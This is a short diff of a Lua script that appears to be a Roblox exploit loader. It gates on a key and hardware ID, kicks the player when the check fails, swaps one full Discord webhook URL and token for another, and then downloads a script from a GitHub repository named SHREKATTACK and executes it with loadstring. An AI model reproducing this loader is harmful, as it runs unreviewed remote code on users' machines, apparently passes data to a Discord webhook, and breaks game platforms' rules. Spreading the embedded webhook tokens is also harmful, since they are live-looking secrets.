@@ -45,5 +45,5 @@ elseif Server == "Invaid HWID !" then
 elseif Server == "Invaid Key" then
     game.Players.LocalPlayer:kick("Invaid Key")
 
-_G.webhooksdiscord = "https://discord.com/api/webhooks/936567608734543883/3tTeBRws9ouredz6_XL4mYoPQNxmq1BLcHJriM9cSdiIA6W8-pYW5l9etXlOwoDs4Ea_"
+_G.webhooksdiscord = "https://discord.com/api/webhooks/936617629853036544/7XkSFc1BHzOYSnSnOClLGN66a5ta0-1YOYIRoQvUogaCerg6dBRTucRCUkme4nMi-vb1"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
